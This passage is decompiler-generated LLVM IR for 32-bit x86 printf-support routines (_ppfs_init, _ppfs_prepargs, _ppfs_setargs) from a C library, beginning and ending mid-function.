  uselistorder label %dec_label_pc_804ec46, { 1, 0 }
  uselistorder label %dec_label_pc_804ebfe, { 1, 0 }
  uselistorder label %dec_label_pc_804ebef, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_804ebb8, { 1, 0 }
  uselistorder label %dec_label_pc_804eba2, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804eb56, { 1, 0 }
  uselistorder label %dec_label_pc_804eb3d, { 1, 0 }
  uselistorder label %dec_label_pc_804eb29, { 1, 0 }
  uselistorder label %dec_label_pc_804eb24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804eb05, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ea8f, { 1, 0 }
  uselistorder label %dec_label_pc_804ea8b, { 1, 0 }
  uselistorder label %dec_label_pc_804ea39, { 1, 0 }
  uselistorder label %dec_label_pc_804ea2e, { 1, 0 }
  uselistorder label %dec_label_pc_804ea05.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ef99 = load i32, i32* @esi, align 4
  %v0_804ef9a = load i32, i32* @ebx, align 4
  %v4_804ef9e = ptrtoint i8* %arg1 to i32
  store i32 %v4_804ef9e, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v4_804ef9e, i32* @edi, align 4
  %v5_804efaf = call i8* @_memset(i8* %arg1, i32 0, i32 47)
  %v0_804efb1 = load i32, i32* @esi, align 4
  %v1_804efb1 = add i32 %v0_804efb1, 24
  %v2_804efb1 = inttoptr i32 %v1_804efb1 to i32*
  %v3_804efb1 = load i32, i32* %v2_804efb1, align 4
  %v4_804efb1 = add i32 %v3_804efb1, -1
  store i32 %v4_804efb1, i32* %v2_804efb1, align 4
  %v0_804efb4 = load i32, i32* @ebx, align 4
  %v1_804efb4 = load i32, i32* @esi, align 4
  %v2_804efb4 = inttoptr i32 %v1_804efb4 to i32*
  store i32 %v0_804efb4, i32* %v2_804efb4, align 4
  %v0_804efb6 = load i32, i32* @esi, align 4
  %v1_804efb6 = add i32 %v0_804efb6, 40
  store i32 %v1_804efb6, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804efbe

dec_label_pc_804efbe:                             ; preds = %dec_label_pc_804efbe, %entry
  %v0_804efbe = phi i32 [ %v1_804efc4, %dec_label_pc_804efbe ], [ %v1_804efb6, %entry ]
  %v1_804efbe = inttoptr i32 %v0_804efbe to i32*
  store i32 8, i32* %v1_804efbe, align 4
  %v0_804efc4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804efc4 = add i32 %v0_804efc4, 4
  store i32 %v1_804efc4, i32* %eax.global-to-local, align 4
  %v0_804efc7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804efc7 = add i32 %v0_804efc7, -1
  %v8_804efc7 = icmp eq i32 %v1_804efc7, 0
  store i32 %v1_804efc7, i32* %edx.global-to-local, align 4
  %v1_804efc8 = icmp eq i1 %v8_804efc7, false
  br i1 %v1_804efc8, label %dec_label_pc_804efbe, label %dec_label_pc_804efca

dec_label_pc_804efca:                             ; preds = %dec_label_pc_804efbe
  %v0_804efca = load i32, i32* @ebx, align 4
  store i32 %v0_804efca, i32* %eax.global-to-local, align 4
  %v1_804eff019 = inttoptr i32 %v0_804efca to i8*
  %v2_804eff020 = load i8, i8* %v1_804eff019, align 1
  %v3_804eff021 = zext i8 %v2_804eff020 to i32
  %v5_804eff022 = and i32 %v1_804efc7, -256
  %v6_804eff023 = or i32 %v3_804eff021, %v5_804eff022
  store i32 %v6_804eff023, i32* %edx.global-to-local, align 4
  %v4_804eff224 = icmp eq i8 %v2_804eff020, 0
  %v1_804eff425 = icmp eq i1 %v4_804eff224, false
  br i1 %v1_804eff425, label %dec_label_pc_804efce, label %dec_label_pc_804eff6

dec_label_pc_804efce:                             ; preds = %dec_label_pc_804efca, %dec_label_pc_804eff0.backedge
  %v6_804eff028 = phi i32 [ %v6_804eff0, %dec_label_pc_804eff0.backedge ], [ %v6_804eff023, %dec_label_pc_804efca ]
  %v2_804eff027 = phi i8 [ %v2_804eff0, %dec_label_pc_804eff0.backedge ], [ %v2_804eff020, %dec_label_pc_804efca ]
  %v0_804efd326 = phi i32 [ %storemerge6, %dec_label_pc_804eff0.backedge ], [ %v0_804efca, %dec_label_pc_804efca ]
  %v10_804efce = icmp eq i8 %v2_804eff027, 37
  %v1_804efd1 = icmp eq i1 %v10_804efce, false
  br i1 %v1_804efd1, label %dec_label_pc_804efef, label %dec_label_pc_804efd3

dec_label_pc_804efd3:                             ; preds = %dec_label_pc_804efce
  %v1_804efd3 = add i32 %v0_804efd326, 1
  store i32 %v1_804efd3, i32* %eax.global-to-local, align 4
  %v1_804efd4 = inttoptr i32 %v1_804efd3 to i8*
  %v2_804efd4 = load i8, i8* %v1_804efd4, align 1
  %v11_804efd4 = icmp eq i8 %v2_804efd4, 37
  br i1 %v11_804efd4, label %dec_label_pc_804efef, label %dec_label_pc_804efd9

dec_label_pc_804efd9:                             ; preds = %dec_label_pc_804efd3
  %v1_804efd9 = load i32, i32* @esi, align 4
  %v2_804efd9 = inttoptr i32 %v1_804efd9 to i32*
  store i32 %v1_804efd3, i32* %v2_804efd9, align 4
  %v0_804efdb = load i32, i32* @esi, align 4
  %v2_804efdc = call i32 @_ppfs_parsespec(i32 %v0_804efdb)
  store i32 %v2_804efdc, i32* %eax.global-to-local, align 4
  %v2_804efe2 = icmp slt i32 %v2_804efdc, 0
  %v1_804efe4 = icmp eq i1 %v2_804efe2, false
  br i1 %v1_804efe4, label %dec_label_pc_804efeb, label %dec_label_pc_804effa

dec_label_pc_804efeb:                             ; preds = %dec_label_pc_804efd9
  %v0_804efeb = load i32, i32* @esi, align 4
  %v1_804efeb = inttoptr i32 %v0_804efeb to i32*
  %v2_804efeb = load i32, i32* %v1_804efeb, align 4
  %v4_804eff0.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804eff0.backedge

dec_label_pc_804efef:                             ; preds = %dec_label_pc_804efd3, %dec_label_pc_804efce
  %v0_804efef = phi i32 [ %v1_804efd3, %dec_label_pc_804efd3 ], [ %v0_804efd326, %dec_label_pc_804efce ]
  %v1_804efef = add i32 %v0_804efef, 1
  br label %dec_label_pc_804eff0.backedge

dec_label_pc_804eff0.backedge:                    ; preds = %dec_label_pc_804efef, %dec_label_pc_804efeb
  %v4_804eff0.pre = phi i32 [ %v4_804eff0.pre.pre, %dec_label_pc_804efeb ], [ %v6_804eff028, %dec_label_pc_804efef ]
  %storemerge6 = phi i32 [ %v2_804efeb, %dec_label_pc_804efeb ], [ %v1_804efef, %dec_label_pc_804efef ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v1_804eff0 = inttoptr i32 %storemerge6 to i8*
  %v2_804eff0 = load i8, i8* %v1_804eff0, align 1
  %v3_804eff0 = zext i8 %v2_804eff0 to i32
  %v5_804eff0 = and i32 %v4_804eff0.pre, -256
  %v6_804eff0 = or i32 %v3_804eff0, %v5_804eff0
  store i32 %v6_804eff0, i32* %edx.global-to-local, align 4
  %v4_804eff2 = icmp eq i8 %v2_804eff0, 0
  %v1_804eff4 = icmp eq i1 %v4_804eff2, false
  br i1 %v1_804eff4, label %dec_label_pc_804efce, label %dec_label_pc_804eff0.dec_label_pc_804eff6_crit_edge

dec_label_pc_804eff0.dec_label_pc_804eff6_crit_edge: ; preds = %dec_label_pc_804eff0.backedge
  %v0_804eff6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804eff6

dec_label_pc_804eff6:                             ; preds = %dec_label_pc_804eff0.dec_label_pc_804eff6_crit_edge, %dec_label_pc_804efca
  %v0_804eff6 = phi i32 [ %v0_804eff6.pre, %dec_label_pc_804eff0.dec_label_pc_804eff6_crit_edge ], [ %v0_804efca, %dec_label_pc_804efca ]
  %v1_804eff6 = load i32, i32* @esi, align 4
  %v2_804eff6 = inttoptr i32 %v1_804eff6 to i32*
  store i32 %v0_804eff6, i32* %v2_804eff6, align 4
  br label %dec_label_pc_804effa

dec_label_pc_804effa:                             ; preds = %dec_label_pc_804efd9, %dec_label_pc_804eff6
  %storemerge = phi i32 [ 0, %dec_label_pc_804eff6 ], [ -1, %dec_label_pc_804efd9 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804effa = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804effa, i32* %edx.global-to-local, align 4
  store i32 %v0_804ef9a, i32* @ebx, align 4
  store i32 %v0_804ef99, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804eff0, { 1, 0 }
  uselistorder i8 %v2_804eff0, { 1, 2, 0 }
  uselistorder i32 %storemerge6, { 1, 2, 0 }
  uselistorder i32 %v0_804efd326, { 1, 0 }
  uselistorder i32 %v0_804efca, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804efc7, { 0, 2, 1 }
  uselistorder i32 %v1_804efc4, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8 }
  uselistorder i32 (i32)* @_ppfs_parsespec, { 1, 0 }
  uselistorder i32 47, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804effa, { 1, 0 }
  uselistorder label %dec_label_pc_804efce, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f000 = load i32, i32* @esi, align 4
  %v0_804f001 = load i32, i32* @ebx, align 4
  store i32 %v0_804f001, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804f00a = add i32 %arg1, 76
  %v3_804f00a = inttoptr i32 %v2_804f00a to i32*
  store i32 %arg2, i32* %v3_804f00a, align 4
  %v0_804f00d = load i32, i32* @ebx, align 4
  %v1_804f00d = add i32 %v0_804f00d, 24
  %v2_804f00d = inttoptr i32 %v1_804f00d to i32*
  %v3_804f00d = load i32, i32* %v2_804f00d, align 4
  %tmp7 = icmp slt i32 %v3_804f00d, 1
  br i1 %tmp7, label %entry.dec_label_pc_804f036_crit_edge, label %dec_label_pc_804f014

entry.dec_label_pc_804f036_crit_edge:             ; preds = %entry
  %v0_804f038.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f036

dec_label_pc_804f014:                             ; preds = %entry
  %v2_804f014 = add i32 %v0_804f00d, 28
  %v3_804f014 = inttoptr i32 %v2_804f014 to i32*
  store i32 %v3_804f00d, i32* %v3_804f014, align 4
  %v0_804f017 = load i32, i32* @ebx, align 4
  %v1_804f017 = add i32 %v0_804f017, 24
  %v2_804f017 = inttoptr i32 %v1_804f017 to i32*
  store i32 0, i32* %v2_804f017, align 4
  %v0_804f01e = load i32, i32* @ebx, align 4
  %v1_804f01e = add i32 %v0_804f01e, 4
  %v2_804f01e = inttoptr i32 %v1_804f01e to i32*
  store i32 0, i32* %v2_804f01e, align 4
  %v0_804f025 = load i32, i32* @ebx, align 4
  %v1_804f025 = add i32 %v0_804f025, 8
  %v2_804f025 = inttoptr i32 %v1_804f025 to i32*
  store i32 0, i32* %v2_804f025, align 4
  %v0_804f02c = load i32, i32* @ebx, align 4
  store i32 %v0_804f02c, i32* %stack_var_-12, align 4
  %v1_804f02d = load i32, i32* %stack_var_-8, align 4
  %v3_804f02d = call i32 @_ppfs_setargs(i32 %v0_804f02c, i32 %v1_804f02d, i32 %v0_804f000)
  %v1_804f032 = load i32, i32* @ebx, align 4
  %v2_804f032 = add i32 %v1_804f032, 24
  %v3_804f032 = inttoptr i32 %v2_804f032 to i32*
  store i32 %v3_804f00d, i32* %v3_804f032, align 4
  %v2_804f035 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f035, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f036

dec_label_pc_804f036:                             ; preds = %entry.dec_label_pc_804f036_crit_edge, %dec_label_pc_804f014
  %v0_804f038 = phi i32 [ %v0_804f038.pre, %entry.dec_label_pc_804f036_crit_edge ], [ %v2_804f035, %dec_label_pc_804f014 ]
  %v2_804f036 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f036, i32* @ebx, align 4
  store i32 %v0_804f000, i32* @esi, align 4
  ret i32 %v0_804f038

; uselistorder directives
  uselistorder i32 %v3_804f00d, { 1, 2, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f036, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f03d = load i32, i32* @ebx, align 4
  store i32 %v0_804f03d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804f042 = add i32 %arg1, 24
  %v2_804f042 = inttoptr i32 %v1_804f042 to i32*
  %v3_804f042 = load i32, i32* %v2_804f042, align 4
  %v4_804f042 = icmp eq i32 %v3_804f042, 0
  %v1_804f046 = icmp eq i1 %v4_804f042, false
  %v1_804f101 = add i32 %arg1, 8
  %v2_804f101 = inttoptr i32 %v1_804f101 to i32*
  %v3_804f101 = load i32, i32* %v2_804f101, align 4
  %v8_804f101 = icmp eq i32 %v3_804f101, -2147483648
  %v1_804f108 = icmp eq i1 %v8_804f101, false
  br i1 %v1_804f046, label %dec_label_pc_804f101, label %dec_label_pc_804f04c

dec_label_pc_804f04c:                             ; preds = %entry
  br i1 %v1_804f108, label %dec_label_pc_804f066, label %dec_label_pc_804f055

dec_label_pc_804f055:                             ; preds = %dec_label_pc_804f04c
  %v1_804f055 = add i32 %arg1, 76
  %v2_804f055 = inttoptr i32 %v1_804f055 to i32*
  %v3_804f055 = load i32, i32* %v2_804f055, align 4
  store i32 %v3_804f055, i32* %eax.global-to-local, align 4
  %v1_804f058 = add i32 %v3_804f055, 4
  store i32 %v1_804f058, i32* %edx.global-to-local, align 4
  store i32 %v1_804f058, i32* %v2_804f055, align 4
  %v0_804f05e = load i32, i32* %eax.global-to-local, align 4
  %v1_804f05e = inttoptr i32 %v0_804f05e to i32*
  %v2_804f05e = load i32, i32* %v1_804f05e, align 4
  store i32 %v2_804f05e, i32* %eax.global-to-local, align 4
  %v1_804f060 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f060 = add i32 %v1_804f060, 80
  %v3_804f060 = inttoptr i32 %v2_804f060 to i32*
  store i32 %v2_804f05e, i32* %v3_804f060, align 4
  %v0_804f063 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f063 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f063 = add i32 %v1_804f063, 8
  %v3_804f063 = inttoptr i32 %v2_804f063 to i32*
  store i32 %v0_804f063, i32* %v3_804f063, align 4
  %v0_804f066.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f066

dec_label_pc_804f066:                             ; preds = %dec_label_pc_804f04c, %dec_label_pc_804f055
  %v1_804f078 = phi i32 [ %arg1, %dec_label_pc_804f04c ], [ %v0_804f066.pre, %dec_label_pc_804f055 ]
  %v1_804f066 = add i32 %v1_804f078, 80
  store i32 %v1_804f066, i32* %ebx.global-to-local, align 4
  %v1_804f069 = add i32 %v1_804f078, 4
  %v2_804f069 = inttoptr i32 %v1_804f069 to i32*
  %v3_804f069 = load i32, i32* %v2_804f069, align 4
  %v8_804f069 = icmp eq i32 %v3_804f069, -2147483648
  %v1_804f070 = icmp eq i1 %v8_804f069, false
  br i1 %v1_804f070, label %dec_label_pc_804f083, label %dec_label_pc_804f072

dec_label_pc_804f072:                             ; preds = %dec_label_pc_804f066
  %v1_804f072 = add i32 %v1_804f078, 76
  %v2_804f072 = inttoptr i32 %v1_804f072 to i32*
  %v3_804f072 = load i32, i32* %v2_804f072, align 4
  store i32 %v3_804f072, i32* %eax.global-to-local, align 4
  %v1_804f075 = add i32 %v3_804f072, 4
  store i32 %v1_804f075, i32* %edx.global-to-local, align 4
  store i32 %v1_804f075, i32* %v2_804f072, align 4
  %v0_804f07b = load i32, i32* %eax.global-to-local, align 4
  %v1_804f07b = inttoptr i32 %v0_804f07b to i32*
  %v2_804f07b = load i32, i32* %v1_804f07b, align 4
  store i32 %v2_804f07b, i32* %eax.global-to-local, align 4
  %v1_804f07d = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f07d = add i32 %v1_804f07d, 80
  %v3_804f07d = inttoptr i32 %v2_804f07d to i32*
  store i32 %v2_804f07b, i32* %v3_804f07d, align 4
  %v0_804f080 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f080 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f080 = add i32 %v1_804f080, 4
  %v3_804f080 = inttoptr i32 %v2_804f080 to i32*
  store i32 %v0_804f080, i32* %v3_804f080, align 4
  %v1_804f0fa15.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f083

dec_label_pc_804f083:                             ; preds = %dec_label_pc_804f066, %dec_label_pc_804f072
  %v1_804f0fa15 = phi i32 [ %v1_804f078, %dec_label_pc_804f066 ], [ %v1_804f0fa15.pre, %dec_label_pc_804f072 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_804f0fa16 = add i32 %v1_804f0fa15, 28
  %v3_804f0fa17 = inttoptr i32 %v2_804f0fa16 to i32*
  %v4_804f0fa18 = load i32, i32* %v3_804f0fa17, align 4
  %v5_804f0fd19 = icmp sgt i32 %v4_804f0fa18, 0
  br i1 %v5_804f0fd19, label %dec_label_pc_804f087, label %dec_label_pc_804f12f.loopexit

dec_label_pc_804f087:                             ; preds = %dec_label_pc_804f083, %dec_label_pc_804f0fa.backedge
  %v1_804f0fa21 = phi i32 [ %v1_804f0fa, %dec_label_pc_804f0fa.backedge ], [ %v1_804f0fa15, %dec_label_pc_804f083 ]
  %v0_804f08b20 = phi i32 [ %v0_804f08b.be, %dec_label_pc_804f0fa.backedge ], [ 0, %dec_label_pc_804f083 ]
  %v2_804f087 = mul i32 %v0_804f08b20, 4
  %v3_804f087 = add i32 %v1_804f0fa21, 40
  %v4_804f087 = add i32 %v3_804f087, %v2_804f087
  %v5_804f087 = inttoptr i32 %v4_804f087 to i32*
  %v6_804f087 = load i32, i32* %v5_804f087, align 4
  store i32 %v6_804f087, i32* %eax.global-to-local, align 4
  %v1_804f08b = add i32 %v0_804f08b20, 1
  store i32 %v1_804f08b, i32* %esi.global-to-local, align 4
  %v1_804f08c = add i32 %v6_804f087, -8
  %v9_804f08c = icmp eq i32 %v1_804f08c, 0
  br i1 %v9_804f08c, label %dec_label_pc_804f0fa.backedge, label %dec_label_pc_804f091

dec_label_pc_804f091:                             ; preds = %dec_label_pc_804f087
  %v10_804f08c = icmp slt i32 %v1_804f08c, 0
  %v6_804f08c = sub i32 7, %v6_804f087
  %v7_804f08c = and i32 %v6_804f08c, %v6_804f087
  %v8_804f08c = icmp slt i32 %v7_804f08c, 0
  %v1_804f091 = add i32 %v1_804f0fa21, 76
  %v2_804f091 = inttoptr i32 %v1_804f091 to i32*
  %v3_804f091 = load i32, i32* %v2_804f091, align 4
  store i32 %v3_804f091, i32* %edx.global-to-local, align 4
  %v3_804f094 = icmp eq i1 %v10_804f08c, %v8_804f08c
  br i1 %v3_804f094, label %dec_label_pc_804f0a4, label %dec_label_pc_804f096

dec_label_pc_804f096:                             ; preds = %dec_label_pc_804f091
  %tmp13 = icmp slt i32 %v6_804f087, 3
  %v9_804f09d = icmp eq i32 %v6_804f087, 7
  %v1_804f0a0 = icmp eq i1 %v9_804f09d, false
  %or.cond = or i1 %tmp13, %v1_804f0a0
  br i1 %or.cond, label %dec_label_pc_804f0ed, label %dec_label_pc_804f0cf

dec_label_pc_804f0a4:                             ; preds = %dec_label_pc_804f091
  %tmp14 = icmp sgt i32 %v6_804f087, 1024
  br i1 %tmp14, label %dec_label_pc_804f0ad, label %dec_label_pc_804f0ed

dec_label_pc_804f0ad:                             ; preds = %dec_label_pc_804f0a4
  %v6_804f0ad = icmp eq i32 %v6_804f087, 2048
  br i1 %v6_804f0ad, label %dec_label_pc_804f0bd, label %dec_label_pc_804f0b4

dec_label_pc_804f0b4:                             ; preds = %dec_label_pc_804f0ad
  %v9_804f0b4 = icmp eq i32 %v6_804f087, 2055
  %v1_804f0b9 = icmp eq i1 %v9_804f0b4, false
  br i1 %v1_804f0b9, label %dec_label_pc_804f0ed, label %dec_label_pc_804f0de

dec_label_pc_804f0bd:                             ; preds = %dec_label_pc_804f0ad
  %v1_804f0bd = add i32 %v3_804f091, 8
  store i32 %v1_804f0bd, i32* %eax.global-to-local, align 4
  store i32 %v1_804f0bd, i32* %v2_804f091, align 4
  %v0_804f0c3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f0c3 = inttoptr i32 %v0_804f0c3 to i32*
  %v2_804f0c3 = load i32, i32* %v1_804f0c3, align 4
  store i32 %v2_804f0c3, i32* %eax.global-to-local, align 4
  %v1_804f0c5 = add i32 %v0_804f0c3, 4
  %v2_804f0c5 = inttoptr i32 %v1_804f0c5 to i32*
  %v3_804f0c5 = load i32, i32* %v2_804f0c5, align 4
  store i32 %v3_804f0c5, i32* %edx.global-to-local, align 4
  %v1_804f0c8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f0c8 = inttoptr i32 %v1_804f0c8 to i32*
  store i32 %v2_804f0c3, i32* %v2_804f0c8, align 4
  %v0_804f0ca = load i32, i32* %edx.global-to-local, align 4
  %v1_804f0ca = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f0ca = add i32 %v1_804f0ca, 4
  %v3_804f0ca = inttoptr i32 %v2_804f0ca to i32*
  store i32 %v0_804f0ca, i32* %v3_804f0ca, align 4
  br label %dec_label_pc_804f0f7

dec_label_pc_804f0cf:                             ; preds = %dec_label_pc_804f096
  %v3_804f0cf = load i32, i32* %v2_804f091, align 4
  store i32 %v3_804f0cf, i32* %edx.global-to-local, align 4
  %v1_804f0d2 = add i32 %v3_804f0cf, 8
  store i32 %v1_804f0d2, i32* %eax.global-to-local, align 4
  store i32 %v1_804f0d2, i32* %v2_804f091, align 4
  %v0_804f0d8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f0d8 = inttoptr i32 %v0_804f0d8 to double*
  %v2_804f0d8 = load double, double* %v1_804f0d8, align 4
  %v2_804f0da = load i32, i32* %ebx.global-to-local, align 4
  %v4_804f0da = inttoptr i32 %v2_804f0da to double*
  store double %v2_804f0d8, double* %v4_804f0da, align 4
  br label %dec_label_pc_804f0f7

dec_label_pc_804f0de:                             ; preds = %dec_label_pc_804f0b4
  %v3_804f0de = load i32, i32* %v2_804f091, align 4
  store i32 %v3_804f0de, i32* %edx.global-to-local, align 4
  %v1_804f0e1 = add i32 %v3_804f0de, 12
  store i32 %v1_804f0e1, i32* %eax.global-to-local, align 4
  store i32 %v1_804f0e1, i32* %v2_804f091, align 4
  %v0_804f0e7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f0e7 = inttoptr i32 %v0_804f0e7 to x86_fp80*
  %v2_804f0e7 = load x86_fp80, x86_fp80* %v1_804f0e7, align 4
  %v2_804f0e9 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804f0e9 = inttoptr i32 %v2_804f0e9 to x86_fp80*
  store x86_fp80 %v2_804f0e7, x86_fp80* %v3_804f0e9, align 4
  br label %dec_label_pc_804f0f7

dec_label_pc_804f0ed:                             ; preds = %dec_label_pc_804f096, %dec_label_pc_804f0a4, %dec_label_pc_804f0b4
  %v1_804f0ed = add i32 %v3_804f091, 4
  store i32 %v1_804f0ed, i32* %eax.global-to-local, align 4
  store i32 %v1_804f0ed, i32* %v2_804f091, align 4
  %v0_804f0f3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f0f3 = inttoptr i32 %v0_804f0f3 to i32*
  %v2_804f0f3 = load i32, i32* %v1_804f0f3, align 4
  store i32 %v2_804f0f3, i32* %eax.global-to-local, align 4
  %v1_804f0f5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f0f5 = inttoptr i32 %v1_804f0f5 to i32*
  store i32 %v2_804f0f3, i32* %v2_804f0f5, align 4
  br label %dec_label_pc_804f0f7

dec_label_pc_804f0f7:                             ; preds = %dec_label_pc_804f0de, %dec_label_pc_804f0cf, %dec_label_pc_804f0bd, %dec_label_pc_804f0ed
  %v0_804f0f7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f0f7 = add i32 %v0_804f0f7, 12
  store i32 %v1_804f0f7, i32* %ebx.global-to-local, align 4
  %v0_804f0fa.pre.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804f0fa.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f0fa.backedge

dec_label_pc_804f0fa.backedge:                    ; preds = %dec_label_pc_804f0f7, %dec_label_pc_804f087
  %v1_804f0fa = phi i32 [ %v1_804f0fa.pre, %dec_label_pc_804f0f7 ], [ %v1_804f0fa21, %dec_label_pc_804f087 ]
  %v0_804f08b.be = phi i32 [ %v0_804f0fa.pre.pre, %dec_label_pc_804f0f7 ], [ %v1_804f08b, %dec_label_pc_804f087 ]
  %v2_804f0fa = add i32 %v1_804f0fa, 28
  %v3_804f0fa = inttoptr i32 %v2_804f0fa to i32*
  %v4_804f0fa = load i32, i32* %v3_804f0fa, align 4
  %v5_804f0fd = icmp slt i32 %v0_804f08b.be, %v4_804f0fa
  br i1 %v5_804f0fd, label %dec_label_pc_804f087, label %dec_label_pc_804f12f.loopexit

dec_label_pc_804f101:                             ; preds = %entry
  br i1 %v1_804f108, label %dec_label_pc_804f118, label %dec_label_pc_804f10a

dec_label_pc_804f10a:                             ; preds = %dec_label_pc_804f101
  %v1_804f10a = add i32 %arg1, 36
  %v2_804f10a = inttoptr i32 %v1_804f10a to i8*
  %v3_804f10a = load i8, i8* %v2_804f10a, align 1
  %v2_804f10e = zext i8 %v3_804f10a to i32
  %v3_804f10e = mul nuw nsw i32 %v2_804f10e, 12
  store i32 %v3_804f10e, i32* %eax.global-to-local, align 4
  %v2_804f111 = add i32 %arg1, 68
  %v3_804f111 = add i32 %v2_804f111, %v3_804f10e
  %v4_804f111 = inttoptr i32 %v3_804f111 to i32*
  %v5_804f111 = load i32, i32* %v4_804f111, align 4
  store i32 %v5_804f111, i32* %eax.global-to-local, align 4
  store i32 %v5_804f111, i32* %v2_804f101, align 4
  %v0_804f118.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f118

dec_label_pc_804f118:                             ; preds = %dec_label_pc_804f101, %dec_label_pc_804f10a
  %v1_804f12c = phi i32 [ %arg1, %dec_label_pc_804f101 ], [ %v0_804f118.pre, %dec_label_pc_804f10a ]
  %v1_804f118 = add i32 %v1_804f12c, 4
  %v2_804f118 = inttoptr i32 %v1_804f118 to i32*
  %v3_804f118 = load i32, i32* %v2_804f118, align 4
  %v8_804f118 = icmp eq i32 %v3_804f118, -2147483648
  %v1_804f11f = icmp eq i1 %v8_804f118, false
  br i1 %v1_804f11f, label %dec_label_pc_804f12f, label %dec_label_pc_804f121

dec_label_pc_804f121:                             ; preds = %dec_label_pc_804f118
  %v1_804f121 = add i32 %v1_804f12c, 37
  %v2_804f121 = inttoptr i32 %v1_804f121 to i8*
  %v3_804f121 = load i8, i8* %v2_804f121, align 1
  %v2_804f125 = zext i8 %v3_804f121 to i32
  %v3_804f125 = mul nuw nsw i32 %v2_804f125, 12
  store i32 %v3_804f125, i32* %eax.global-to-local, align 4
  %v2_804f128 = add i32 %v1_804f12c, 68
  %v3_804f128 = add i32 %v2_804f128, %v3_804f125
  %v4_804f128 = inttoptr i32 %v3_804f128 to i32*
  %v5_804f128 = load i32, i32* %v4_804f128, align 4
  store i32 %v5_804f128, i32* %eax.global-to-local, align 4
  store i32 %v5_804f128, i32* %v2_804f118, align 4
  %v0_804f12f.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f12f

dec_label_pc_804f12f.loopexit:                    ; preds = %dec_label_pc_804f0fa.backedge, %dec_label_pc_804f083
  %v1_804f0fa.lcssa = phi i32 [ %v1_804f0fa15, %dec_label_pc_804f083 ], [ %v1_804f0fa, %dec_label_pc_804f0fa.backedge ]
  br label %dec_label_pc_804f12f

dec_label_pc_804f12f:                             ; preds = %dec_label_pc_804f12f.loopexit, %dec_label_pc_804f118, %dec_label_pc_804f121
  %v1_804f138 = phi i32 [ %v1_804f0fa.lcssa, %dec_label_pc_804f12f.loopexit ], [ %v1_804f12c, %dec_label_pc_804f118 ], [ %v0_804f12f.pre, %dec_label_pc_804f121 ]
  %v1_804f12f = add i32 %v1_804f138, 8
  %v2_804f12f = inttoptr i32 %v1_804f12f to i32*
  %v3_804f12f = load i32, i32* %v2_804f12f, align 4
  store i32 %v3_804f12f, i32* %eax.global-to-local, align 4
  %v2_804f132 = icmp slt i32 %v3_804f12f, 0
